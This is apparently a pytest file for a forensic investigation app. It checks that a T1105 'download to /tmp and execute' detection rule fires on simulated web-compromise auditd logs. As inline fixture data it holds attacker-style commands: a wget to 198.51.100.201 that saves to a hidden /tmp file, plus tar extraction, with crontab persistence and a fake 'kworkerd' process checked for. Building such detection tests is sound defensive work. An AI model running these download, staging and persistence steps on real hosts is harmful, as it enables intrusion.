import uuid
from pathlib import Path

from fastapi.testclient import TestClient
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker

from app.main import app as fastapi_app
from app.core.dependencies import get_current_user
from app.core.security import hash_password
from app.db.base import Base
import app.db.models  # noqa: F401
from app.db.models.case import Case, CaseStatus
from app.db.models.user import User, UserRole
from app.db.session import get_db
from app.api.v1 import evidence as evidence_module
from app.parsers.auditd import AuditdParser
from app.services.detection_engine import execute_detections_on_events
from app.services.normalizer import normalize_records


WEB_COMPROMISE_DIR = (
    Path(__file__).resolve().parents[1] / "test_evidence" / "web_server_compromise"
)


def test_tmp_download_transfer_correlation_t1105_and_window():
    audit_path = WEB_COMPROMISE_DIR / "03_auditd.log"
    assert audit_path.is_file()

    records = AuditdParser().parse(audit_path, original_filename="03_auditd.log")
    normalized = normalize_records(records, default_filename="03_auditd.log")
    events = []
    for idx, rec in enumerate(normalized):
        rec["id"] = f"aud-{idx}"
        events.append(rec)

    findings = execute_detections_on_events(events, uuid.uuid4())
    transfer_findings = [f for f in findings if f["rule_id"] == "rule-tmp-download-exec"]
    assert len(transfer_findings) == 1

    finding = transfer_findings[0]
    assert finding["mitre_technique"] == "T1105"
    assert finding["mitre_tactic"] == "Command and Control"
    assert finding["user"] == "root"
    assert "chmod +x" not in finding["description"].lower()

    by_id = {e["id"]: e["details"]["command_line"] for e in events}
    matched_cmds = [by_id[eid] for eid in finding["matching_event_ids"]]
    assert any(cmd.startswith("wget ") and "/tmp/.x.tgz" in cmd for cmd in matched_cmds)
    assert any(cmd.startswith("tar ") and "/tmp/.x.tgz" in cmd for cmd in matched_cmds)
    assert any(cmd.startswith("crontab ") and "/tmp/.cron" in cmd for cmd in matched_cmds)
    assert any("kworkerd" in cmd for cmd in matched_cmds)
    assert not any(cmd.startswith("scp ") for cmd in matched_cmds)
    assert not any(cmd.startswith("rm ") for cmd in matched_cmds)

    # Isolated wget with no follow-up within 5 minutes must not fire
    isolated = [
        {
            "id": "iso-1",
            "timestamp": "2026-07-22T02:00:00Z",
            "event_type": "auditd",
            "details": {"host": "WEB-01", "user": "root", "command_line": "wget http://198.51.100.201/a.tgz -O /tmp/.a.tgz"},
        },
        {
            "id": "iso-2",
            "timestamp": "2026-07-22T02:06:00Z",
            "event_type": "auditd",
            "details": {"host": "WEB-01", "user": "root", "command_line": "tar xzf /tmp/.a.tgz -C /tmp/.a"},
        },
    ]
    assert [f for f in execute_detections_on_events(isolated, uuid.uuid4()) if f["rule_id"] == "rule-tmp-download-exec"] == []


def test_tmp_download_transfer_api_finding_with_auditd_uid_zero(tmp_path, monkeypatch):
    auth_path = WEB_COMPROMISE_DIR / "02_auth.log"
    audit_path = WEB_COMPROMISE_DIR / "03_auditd.log"
    assert auth_path.is_file() and audit_path.is_file()

    test_db = tmp_path / "ingress_transfer.sqlite"
    engine = create_engine(f"sqlite:///{test_db}", connect_args={"check_same_thread": False})
    Base.metadata.create_all(bind=engine)
    TestSession = sessionmaker(bind=engine, autoflush=False, autocommit=False)
    upload_dir = tmp_path / "evidence_uploads"
    upload_dir.mkdir(parents=True, exist_ok=True)
    monkeypatch.setattr(evidence_module, "UPLOAD_DIR", upload_dir)

    db = TestSession()
    user = User(
        username=f"inv_{uuid.uuid4().hex[:8]}",
        email=f"inv_{uuid.uuid4().hex[:8]}@dcsre.test",
        hashed_password=hash_password("Investigator#2026"),
        role=UserRole.INVESTIGATOR,
        is_active=True,
    )
    db.add(user)
    db.flush()
    case = Case(
        name="Ingress Transfer Case",
        description="Auth + Auditd",
        status=CaseStatus.OPEN,
        created_by=user.id,
    )
    db.add(case)
    db.commit()

    def override_get_db():
        session = TestSession()
        try:
            yield session
        finally:
            session.close()

    prev_db = fastapi_app.dependency_overrides.get(get_db)
    prev_user = fastapi_app.dependency_overrides.get(get_current_user)
    fastapi_app.dependency_overrides[get_db] = override_get_db
    fastapi_app.dependency_overrides[get_current_user] = lambda: user
    try:
        client = TestClient(fastapi_app)
        for fname in ("02_auth.log", "03_auditd.log"):
            fpath = WEB_COMPROMISE_DIR / fname
            with fpath.open("rb") as fh:
                res = client.post(
                    f"/api/v1/evidence/cases/{case.id}/evidence/upload",
                    files={"file": (fname, fh, "text/plain")},
                    data={"description": fname},
                )
                assert res.status_code == 201, res.text

        events_by_id = {
            str(e["id"]): e
            for e in client.get(f"/api/v1/events/cases/{case.id}/events").json()
        }
        detections = client.get(f"/api/v1/detections/cases/{case.id}/detections").json()
        transfer_findings = [d for d in detections if d.get("rule_id") == "rule-tmp-download-exec"]
        assert len(transfer_findings) == 1

        finding = transfer_findings[0]
        assert finding["mitre_technique"] == "T1105"
        assert finding["mitre_tactic"] == "Command and Control"
        assert "WEB-01" in (finding.get("hosts") or [])

        # User comes from uid=0 ("root"), never a command name like "scp"
        entity_users = (finding.get("entities_involved") or {}).get("users") or []
        assert entity_users == ["root"]
        assert not (set(entity_users) & {"scp", "wget", "tar", "crontab", "kworkerd"})

        matched_cmds = [events_by_id[eid].get("command_line") or "" for eid in finding["matched_event_ids"]]
        assert len(matched_cmds) == 4
        assert any("wget" in cmd and "/tmp/.x.tgz" in cmd for cmd in matched_cmds)
        assert any("tar" in cmd and "/tmp/.x.tgz" in cmd for cmd in matched_cmds)
        assert any("crontab" in cmd and "/tmp/.cron" in cmd for cmd in matched_cmds)
        assert any("kworkerd" in cmd for cmd in matched_cmds)
    finally:
        if prev_db is not None:
            fastapi_app.dependency_overrides[get_db] = prev_db
        else:
            fastapi_app.dependency_overrides.pop(get_db, None)
        if prev_user is not None:
            fastapi_app.dependency_overrides[get_current_user] = prev_user
        else:
            fastapi_app.dependency_overrides.pop(get_current_user, None)
        db.close()
        engine.dispose()
